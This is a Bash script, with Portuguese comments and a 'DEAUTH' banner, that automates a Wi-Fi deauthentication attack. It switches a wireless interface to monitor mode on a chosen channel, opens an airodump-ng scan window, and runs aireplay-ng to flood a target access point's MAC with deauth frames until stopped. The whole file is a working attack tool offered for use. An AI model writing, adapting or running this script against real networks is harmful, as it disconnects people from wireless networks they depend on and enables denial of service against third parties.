#!/bin/bash

# Uso: sudo ./deauth.sh -i <interface> -m <MAC_do_AP> -c <canal>

# Cores ANSI
RED=$'\033[0;31m'
GREEN=$'\033[0;32m'
YELLOW=$'\033[1;33m'
BLUE=$'\033[0;34m'
PURPLE=$'\033[0;35m'
CYAN=$'\033[0;36m'
WHITE=$'\033[1;37m'
NC=$'\033[0m'

pause() {
read -r -p "${GREEN} Pressione Enter para iniciar...${NC}"
}

# Funcao para imprimir o logo
print_logo() {
clear
    echo -e "${RED}"
    echo " ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗"
    echo " ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║"
    echo " ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║"
    echo " ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║"
    echo " ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║"
    echo " ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝"
    echo -e "${NC}"
}
scan-redes() {
xterm -T "Scaneando Redes" -geometry 111x24+1766+200 -hold -e sudo airodump-ng wlx90de807bb027
}

# Verifica se é root
if [ "$EUID" -ne 0 ]; then
    echo -e "${RED}Erro: Este script deve ser executado como root (use sudo).${NC}"
    exit 1
fi

# Exibe o logo
print_logo

# Ajuda
if [ "$1" == "-h" ] || [ "$1" == "--help" ]; then
    echo -e "${WHITE}Uso: $0 -i <interface> -m <MAC_do_AP> -c <canal>${NC}"
    echo -e "${CYAN}  -i   Interface Wi-Fi (ex: wlan0, wlx...)${NC}"
    echo -e "${CYAN}  -m   MAC address do AP alvo${NC}"
    echo -e "${CYAN}  -c   Canal onde o AP esta operando${NC}"
    exit 0
fi

# Inicializa variaveis
INTERFACE=""
BSSID=""
CHANNEL=""

# Parse dos argumentos
while getopts "i:m:c:" opt; do
    case $opt in
        i) INTERFACE="$OPTARG" ;;
        m) BSSID="$OPTARG" ;;
        c) CHANNEL="$OPTARG" ;;
        *) echo -e "${RED}Opcao invalida. Use -h para ajuda.${NC}"; exit 1 ;;
    esac
done

# Verifica se todos os parametros foram fornecidos
if [ -z "$INTERFACE" ] || [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
    echo -e "${RED}Erro: Interface, MAC e canal sao obrigatorios.${NC}"
    echo -e "${WHITE}Exemplo: $0 -i wlan0 -m AA:BB:CC:DD:EE:FF -c 6${NC}"
    exit 1
fi

# Verifica se a interface existe
if ! ip link show "$INTERFACE" > /dev/null 2>&1; then
    echo -e "${RED}Erro: Interface $INTERFACE nao encontrada.${NC}"
    exit 1
fi

# Verifica se a interface ja esta em modo monitor
CURRENT_TYPE=$(iw dev "$INTERFACE" info 2>/dev/null | grep type | awk '{print $2}')
if [ "$CURRENT_TYPE" == "monitor" ]; then
    echo -e "${GREEN}[+] Interface $INTERFACE ja esta em modo monitor.${NC}"
    MONITOR_INTERFACE="$INTERFACE"
else
    echo -e "${YELLOW}[*] Colocando $INTERFACE em modo monitor...${NC}"
    ip link set "$INTERFACE" down
    iw dev "$INTERFACE" set type monitor
    ip link set "$INTERFACE" up
    MONITOR_INTERFACE="$INTERFACE"
    echo -e "${GREEN}[+] Modo monitor ativado.${NC}"
fi

# Sintoniza o canal correto
echo -e "${YELLOW}[*] Ajustando para o canal $CHANNEL...${NC}"
iw dev "$MONITOR_INTERFACE" set channel "$CHANNEL"

# Exibe informacoes do ataque
echo ""
echo -e "${GREEN}=========================================="
echo -e "${WHITE}  Alvo: ${CYAN}$BSSID"
echo -e "${WHITE}  Interface: ${CYAN}$MONITOR_INTERFACE"
echo -e "${WHITE}  Canal: ${CYAN}$CHANNEL"
echo -e "${GREEN}=========================================="
echo ""

# Funcao de limpeza
cleanup() {
    echo ""
    echo -e "${YELLOW}[*] Encerrando ataque...${NC}"
    if [ "$CURRENT_TYPE" != "monitor" ]; then
        echo -e "${YELLOW}[*] Restaurando modo gerenciado...${NC}"
        ip link set "$MONITOR_INTERFACE" down
        iw dev "$MONITOR_INTERFACE" set type managed
        ip link set "$MONITOR_INTERFACE" up
    fi
    systemctl restart NetworkManager 2>/dev/null
    echo -e "${GREEN}[+] Finalizado. Wi-Fi restaurado.${NC}"
    exit 0
}

trap cleanup INT TERM

# Inicia o ataque de deauth continuo
pause
echo -e "${GREEN}[+] Iniciando ataque de deauth (pressione Ctrl+C para parar)${NC}"
echo ""
scan-redes &
sudo aireplay-ng -0 0 -a "$BSSID" "$MONITOR_INTERFACE"

# Caso o aireplay-ng termine sozinho
cleanup
